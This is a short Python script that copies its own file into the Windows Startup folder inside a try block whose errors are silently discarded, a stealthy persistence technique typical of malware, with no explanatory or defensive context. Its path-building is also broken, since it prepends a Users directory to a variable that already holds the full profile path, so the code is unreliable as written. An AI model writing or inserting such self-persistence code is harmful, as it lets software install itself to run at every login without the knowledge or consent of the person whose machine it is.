import shutil
import os


try:
    shutil.copy(__file__, "C:\Users\\"+os.environ['USERPROFILE']+"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
except:
    pass